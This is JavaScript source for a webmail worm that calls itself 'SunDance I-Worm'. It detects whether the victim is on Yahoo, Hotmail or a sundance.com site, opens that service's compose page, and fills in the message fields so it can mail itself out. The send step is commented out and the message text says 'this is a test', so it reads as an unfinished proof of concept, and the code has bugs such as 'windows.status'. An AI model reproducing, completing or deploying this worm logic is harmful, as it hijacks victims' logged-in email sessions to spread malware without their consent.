// SunDance I-Worm
// (c) by Energy


if (windows.status != "wwactive") {
windows.onerror = fnc_win_error;

var w_win_apple;

var w_bln_windows_error = false;

var w_str_apple_wait_next_call = "";
var w_int_apple_wait_link_num = 0;
}


function fnc_init() {
windows.status = "wwactive";
w_win_apple = windows.open("", "apple");
var str_webmail = fnc_get_webmail_type();
eval("fnc_worm_" + str_webmail + "();");
}


function fnc_worm_sundance() {
w_win_apple.document.location.href = "http://www.sundance.com/webworm/apple.php";

w_str_apple_wait_next_call = "fnc_worm_sundance_2();";
fnc_wait_for_apple_loop();
}

function fnc_worm_sundance_2() {
//w_win_apple.document.frm1.txt1.value="yes";
alert(w_win_apple.document.links.length);
}

function fnc_worm_yahoo() {
w_win_apple.document.location.href = "http://us.f117.mail.yahoo.com/ym/Compose?YY=12345";

w_str_apple_wait_next_call = "fnc_worm_yahoo_2();";
fnc_wait_for_apple_loop();
}

function fnc_worm_yahoo_2() {
w_win_apple.document.Compose.To.value=" ";
w_win_apple.document.Compose.Subj.value="The Completed Story about Energy";
w_win_apple.document.Compose.Body.value="Well, this is a test. (c) by Energy";

// Submit it
//w_win_apple.document.Compose.elements[10].click();

}


function fnc_worm_hotmail() {
w_win_apple.document.location.href = "http://lw15fd.law15.hotmail.msn.com/cgi-bin/compose?curmbox=F000000001";

// Wait until the page loads
w_str_apple_wait_next_call = "fnc_worm_hotmail_2();";
fnc_wait_for_apple_loop();
}

function fnc_worm_hotmail_2() {
// Compose a new email to someone
w_win_apple.document.composeform.to.value=" ";
w_win_apple.document.composeform.subject.value="The Completed Story about Energy";
w_win_apple.document.composeform.body.value="Well, this is a test. (c) by Energy";
}


// Function: fnc_get_webmail_type()
// Purpose: Determine what webmail service the victim is using
function fnc_get_webmail_type() {
var str_location = document.location.href;

var re_yahoo = /\.yahoo\.com/i;
var re_hotmail = /\.hotmail\.msn\.com/i;
var re_sundance = /\.sundance\.com/i;

if (str_location.search(re_yahoo) != -1) return "yahoo";
if (str_location.search(re_hotmail) != -1) return "hotmail";
if (str_location.search(re_sundance) != -1) return "sundance";

return "";
}

function fnc_win_error(arg1, arg2, arg3) {
w_bln_windows_error = true;
return true;
}

function fnc_wait_for_apple_loop() { 
var int_win_links = w_win_apple.document.links.length;

// If there are more links, or the link count is 0
if ((int_win_links != w_int_apple_wait_link_num) || (int_win_links == 0)) {
w_int_apple_wait_link_num = int_win_links;
setTimeout("fnc_wait_for_apple_loop();", 500);
}
// Else, proceed to the next page call by the worm
else {
eval(w_str_apple_wait_next_call);
}
}


// Begin the worm's life
if (windows.status != "wwactive") fnc_init();


